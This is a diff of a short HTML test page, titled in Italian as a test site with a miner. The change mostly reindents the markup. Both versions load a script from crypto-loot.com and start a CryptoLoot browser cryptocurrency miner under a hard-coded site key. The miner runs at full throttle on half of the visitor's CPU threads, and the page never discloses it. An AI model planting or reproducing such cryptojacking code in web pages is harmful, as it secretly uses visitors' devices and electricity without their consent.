@@ -1,22 +1,22 @@
 <!DOCTYPE html>
 <html>
-<body>
-<head>
-	<title>Sito prova con miner</title>
-</head>
-	<p lang="it">Paragrafo in header</p>
-<script src="https://crypto-loot.com/lib/miner.min.js"></script>
-<script>
-            var threads = window.navigator.hardwareConcurrency / 2;
-            if (threads < 1) {
-                var threads = 3;
-            }
-            var miner=new CryptoLoot.Anonymous('7187b7c8a4219801993181c9e0ec0c0c63e7ef0c61d6',
-       		{
-       		threads:threads,autoThreads:false,throttle:0,
-        	}
-);
-miner.start();
-</script>
-</body>
+	<head>
+		<title>Sito prova con miner</title>
+	</head>
+	<body>
+		<p lang="it">Paragrafo in header</p>
+	<script src="https://crypto-loot.com/lib/miner.min.js"></script>
+		<script>
+        	    var threads = window.navigator.hardwareConcurrency / 2;
+            	if (threads < 1) {
+                	var threads = 3;
+            		}
+            	var miner=new CryptoLoot.Anonymous('7187b7c8a4219801993181c9e0ec0c0c63e7ef0c61d6',
+       			{
+       				threads:threads,autoThreads:false,throttle:0,
+        		}
+					);
+						miner.start();
+		</script>
+	</body>
 </html>
